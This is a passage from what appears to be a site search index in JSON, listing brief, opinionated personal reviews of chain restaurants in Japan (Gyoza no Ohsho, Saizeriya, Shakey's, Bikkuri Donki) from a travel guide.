either.</p>"},{"location":"content/travel/japan-guide/#chinese","title":"Chinese","text":"<p>Gyoza no Ohsho - Good japanized chinese food.</p>"},{"location":"content/travel/japan-guide/#italian","title":"Italian","text":"<p>Saiseriya - worst \"italian\" food ever, cheapest worst wine in the world.</p> <p>Shakey's pizza - worst pizza in the world.</p>"},{"location":"content/travel/japan-guide/#other","title":"Other","text":"<p>Bikkuri Donki - Weird place, little pricier, but good food.</p>"}]}